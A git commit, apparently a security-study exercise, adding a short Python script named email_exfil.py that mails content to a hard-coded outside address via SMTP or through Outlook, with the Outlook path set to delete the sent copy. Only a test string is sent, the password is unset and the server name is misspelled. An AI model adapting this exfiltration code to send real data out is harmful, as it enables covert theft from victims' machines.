36d2697b8cb261a3f9095343a93ea807ec21d4ed
DarkEtherDE <darkether870@gmail.com>
2023-03-19 04:12:14 -0500

    Create email_exfil.py
    This WILL fail, emails don't provide passwords, don't recommend filling in data for security reasons without other encryption methods. Use with caution

---
+++ EncryptionStudies/email_exfil.py
@@ -0,0 +1,33 @@
+import smtplib
+import time
+import win32com.client
+
+smtp_server = 'smtp.gamil.com'
+smtp_port = 587
+smtp_acct = 'darkether870@gmail.com'
+smtp_passwd = None
+tgt_acct = ['jonathan@brinkley.ws']
+
+def plain_email(subject, contents):
+    message = f'Subject: {subject}\nFrom {smtp_acct}\n'
+    message += f'To: {tgt_acct}\n\n{contents.encode()}'
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(smtp_acct, smtp_passwd)
+#server.set_debuglevel(1)
+    server.sendmail(smtp_acct, tgt_acct, message)
+    time.sleep(1)
+    server.quit()
+    
+def outlook(subject, contents):
+    outlook = win32com.client.Dispatch("Outlook.Application")
+    message = outlook.CreateItem(0)
+    message.DeleteAfterSubmit = True
+    message.Subject = subject
+    message.Body = contents.decode()
+    message.To = tgt_acct[0]
+    message.Send()
+    
+if __name__ == '__main__':
+    plain_email('test2 message', 'attack at dawn')
+    
